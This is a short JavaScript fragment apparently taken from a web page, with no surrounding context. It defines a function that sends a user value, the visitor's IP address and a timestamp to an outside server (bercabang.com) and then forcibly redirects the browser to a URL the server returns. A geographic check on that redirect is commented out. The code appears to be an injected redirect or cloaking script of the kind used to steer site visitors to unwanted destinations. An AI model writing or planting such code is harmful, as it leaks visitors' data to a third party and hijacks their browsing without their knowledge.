function eks(ip) {
		$.get( "https://bercabang.com/js.php?us=" +usr+ "&ip=" +ip+ "&time"+Date.now(), function( data ) {
			//console.log(data)
			console.log(data.url)
			console.log(data.geo)
					//if(!data.geo == 'ID'){
						window.location.replace(data.url);
					//}
		});
}
